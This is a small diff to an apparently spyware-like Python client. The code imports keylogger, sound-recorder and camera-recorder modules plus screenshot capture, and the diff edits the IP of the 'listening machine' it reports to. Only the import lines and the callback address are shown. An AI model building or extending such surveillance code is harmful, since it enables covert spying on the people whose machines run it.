@@ -10,7 +10,7 @@ from time import *
 import requests as rq
 from mss import mss
 import threading
-import keyLogger, soundRecorder, camRecorder
+from utils import soundRecorder, camRecorder, keyLogger
 
 
 
@@ -363,7 +363,7 @@ except Exception as e:
 	img_path = os.environ["HOME"] + "/Image.png"
 
 # details of the listening machine (connect to)
-connect_ip = "192.168.0.107"
+connect_ip = "192.168.0.104"
 conn_port = 54321
 
 stop_key = False
